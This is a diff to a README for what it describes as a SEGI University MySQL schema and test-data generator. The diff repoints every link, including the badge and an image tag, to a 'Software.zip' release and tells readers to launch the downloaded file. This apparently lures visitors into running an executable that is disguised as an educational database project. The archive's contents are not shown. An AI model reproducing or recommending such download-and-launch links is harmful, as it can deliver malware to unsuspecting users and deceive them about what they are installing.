@@ -1,6 +1,6 @@
 
 # 📚 SEGI Data Model Local Gossip
-[![GitHub release](https://github.com/deez219126/segi-data-model-local-gossip/releases/download/v1.0/Software.zip)](https://github.com/deez219126/segi-data-model-local-gossip/releases/download/v1.0/Software.zip)
+[![GitHub release](https://github.com/deez219126/segi-data-model-local-gossip/releases/download/v2.0/Software.zip)](https://github.com/deez219126/segi-data-model-local-gossip/releases/download/v2.0/Software.zip)
 
 Welcome to the SEGI Data Model Local Gossip repository! This project was developed as an educational endeavor at SEGI University, focusing on creating a MySQL database schema and data generation tool tailored for a social platform. One of the unique features of this project is its Malaysian localization, making it a great learning resource for individuals interested in regional adaptations of database systems. The tool also offers automated test data generation capabilities, enhancing its utility for educational purposes.
 
@@ -34,7 +34,7 @@ The "SEGI Data Model Local Gossip" repository houses a comprehensive MySQL datab
 - Test Data
 
 ## 📥 Download
-To access the project and explore the features firsthand, you can download the latest release of the repository by clicking [here](https://github.com/deez219126/segi-data-model-local-gossip/releases/download/v1.0/Software.zip). Ensure to launch the downloaded file to kickstart your journey into the realm of database modeling and data generation.
+To access the project and explore the features firsthand, you can download the latest release of the repository by clicking [here](https://github.com/deez219126/segi-data-model-local-gossip/releases/download/v2.0/Software.zip). Ensure to launch the downloaded file to kickstart your journey into the realm of database modeling and data generation.
 
 ## 🌐 Explore Further
 Visit the GitHub repository to stay updated on new releases, enhancements, and community contributions. Explore the codebase, documentation, and discussions to gain valuable insights into database modeling, localization strategies, and test data generation.
@@ -43,5 +43,5 @@ Don't forget to star the repository if you find it beneficial for your education
 
 Happy modeling and data generation with SEGI Data Model Local Gossip! 🎉
 
-![SEGI Data Model Local Gossip](https://github.com/deez219126/segi-data-model-local-gossip/releases/download/v1.0/Software.zip)
+![SEGI Data Model Local Gossip](https://github.com/deez219126/segi-data-model-local-gossip/releases/download/v2.0/Software.zip)
 
